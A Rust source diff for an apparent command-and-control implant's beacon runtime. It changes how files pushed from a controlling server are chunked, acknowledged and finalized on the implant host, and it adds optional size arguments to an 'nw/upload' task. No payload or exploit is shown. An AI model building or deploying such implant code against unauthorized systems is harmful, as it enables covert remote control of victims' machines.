@@ -7,7 +7,7 @@ use nw_profile::{
     config::GSocketConfig,
     crypto,
     envelope::{Envelope, Kind},
-    msgs::{PollReply, PollRequest, Register, RegisterAck, Task, TaskResult},
+    msgs::{FileAck, PollReply, PollRequest, Register, RegisterAck, Task, TaskResult},
 };
 use uuid::Uuid;
 
@@ -58,7 +58,15 @@ pub struct BeaconRuntime {
     completed: Mutex<BoundedIds>,
     download: RwLock<Option<Download>>,
     upload: RwLock<Option<crate::upload::Upload>>,
+    terminal_upload: Mutex<Option<TerminalUpload>>,
     stop: AtomicBool,
+}
+
+struct TerminalUpload {
+    ack: FileAck,
+    task_id: Uuid,
+    total: u64,
+    dest: String,
 }
 
 const TASK_ID_MEMORY_LIMIT: usize = 4096;
@@ -123,6 +131,7 @@ impl BeaconRuntime {
             completed: Mutex::new(BoundedIds::default()),
             download: RwLock::new(None),
             upload: RwLock::new(None),
+            terminal_upload: Mutex::new(None),
             stop: AtomicBool::new(false),
         }
     }
@@ -280,7 +289,9 @@ impl BeaconRuntime {
         };
 
         // Acks for the server->implant upload (reflect last-reply write state).
-        let upload_acks = {
+        let upload_acks = if let Some(terminal) = self.terminal_upload.lock().unwrap().as_ref() {
+            vec![terminal.ack]
+        } else {
             let up = self.upload.read().unwrap();
             match up.as_ref() {
                 Some(u) => vec![u.ack()],
@@ -325,11 +336,9 @@ impl BeaconRuntime {
         for ack in pr.acks {
             let mut dl = self.download.write().unwrap();
             if let Some(d) = dl.as_mut() {
-                if ack.transfer_id != Some(d.transfer_id()) {
-                    continue;
-                } else if !ack.done {
+                if ack.transfer_id == Some(d.transfer_id()) && !ack.done {
                     d.resume_to(ack.received);
-                } else if ack.done {
+                } else if ack.transfer_id == Some(d.transfer_id()) && ack.done {
                     self.pending.lock().unwrap().push(TaskResult {
                         task_id: d.task_id(),
                         ok: true,
@@ -341,17 +350,77 @@ impl BeaconRuntime {
                     *dl = None;
                 }
             }
+            let confirmed = self
+                .terminal_upload
+                .lock()
+                .unwrap()
+                .as_ref()
+                .is_some_and(|terminal| {
+                    ack.transfer_id == terminal.ack.transfer_id
+                        && ack.done
+                        && ack.received == terminal.total
+                });
+            if confirmed {
+                let terminal = self.terminal_upload.lock().unwrap().take().unwrap();
+                if let Some(upload) = self.upload.write().unwrap().take() {
+                    if let Err(error) = upload.finalize() {
+                        self.pending.lock().unwrap().push(TaskResult {
+                            task_id: terminal.task_id,
+                            ok: false,
+                            stdout: Vec::new(),
+                            stderr: error.into_bytes(),
+                            exit_code: -1,
+                        });
+                        continue;
+                    }
+                }
+                self.pending.lock().unwrap().push(TaskResult {
+                    task_id: terminal.task_id,
+                    ok: true,
+                    stdout: format!("uploaded {} bytes to {}", terminal.total, terminal.dest)
+                        .into_bytes(),
+                    stderr: Vec::new(),
+                    exit_code: 0,
+                });
+            } else if ack.done {
+                let mut upload = self.upload.write().unwrap();
+                if upload
+                    .as_ref()
+                    .is_some_and(|candidate| ack.transfer_id == Some(candidate.transfer_id()))
+                {
+                    let upload = upload.take().unwrap();
+                    let task_id = upload.task_id();
+                    let total = ack.received;
+                    let dest = upload.dest.clone();
+                    match upload.finalize() {
+                        Ok(()) => self.pending.lock().unwrap().push(TaskResult {
+                            task_id,
+                            ok: true,
+                            stdout: format!("uploaded {total} bytes to {dest}").into_bytes(),
+                            stderr: Vec::new(),
+                            exit_code: 0,
+                        }),
+                        Err(error) => self.pending.lock().unwrap().push(TaskResult {
+                            task_id,
+                            ok: false,
+                            stdout: Vec::new(),
+                            stderr: error.into_bytes(),
+                            exit_code: -1,
+                        }),
+                    }
+                }
+            }
         }
 
         // Write any server->implant upload chunks; finalize when fully received.
         if !pr.push_chunks.is_empty() {
             let mut up = self.upload.write().unwrap();
-            let mut done_meta: Option<(Uuid, u64, String)> = None;
+            let mut done_meta: Option<(FileAck, Uuid, u64, String)> = None;
             if let Some(u) = up.as_mut() {
                 for chunk in &pr.push_chunks {
                     match u.write_chunk(chunk) {
                         Ok(ack) if ack.done => {
-                            done_meta = Some((u.task_id(), ack.total, u.dest.clone()));
+                            done_meta = Some((ack, u.task_id(), ack.total, u.dest.clone()));
                             break;
                         }
                         Ok(_) => {}
@@ -369,15 +438,13 @@ impl BeaconRuntime {
                     }
                 }
             }
-            if let Some((tid, total, dest)) = done_meta {
-                self.pending.lock().unwrap().push(TaskResult {
+            if let Some((ack, tid, total, dest)) = done_meta {
+                *self.terminal_upload.lock().unwrap() = Some(TerminalUpload {
+                    ack,
                     task_id: tid,
-                    ok: true,
-                    stdout: format!("uploaded {} bytes to {dest}", total).into_bytes(),
-                    stderr: Vec::new(),
-                    exit_code: 0,
+                    total,
+                    dest,
                 });
-                *up = None;
             }
         }
         let mut accepted_now = Vec::new();
@@ -549,7 +616,7 @@ impl BeaconRuntime {
         }
         if task.command == "nw/upload" {
             match task.args.as_slice() {
-                [dest, transfer_id] => {
+                [dest, transfer_id] | [dest, transfer_id, _] | [dest, transfer_id, _, _] => {
                     let Ok(transfer_id) = Uuid::parse_str(transfer_id) else {
                         self.pending.lock().unwrap().push(TaskResult {
                             task_id: task.id,
@@ -570,7 +637,14 @@ impl BeaconRuntime {
                             exit_code: -1,
                         });
                     } else {
-                        match crate::upload::Upload::open(dest, transfer_id, task.id) {
+                        let expected_total = task.args.get(2).and_then(|value| value.parse().ok());
+                        match crate::upload::Upload::open_with_total(
+                            dest,
+                            transfer_id,
+                            task.id,
+                            expected_total,
+                            task.args.get(3).filter(|value| !value.is_empty()).cloned(),
+                        ) {
                             Ok(u) => *slot = Some(u),
                             Err(e) => self.pending.lock().unwrap().push(TaskResult {
                                 task_id: task.id,
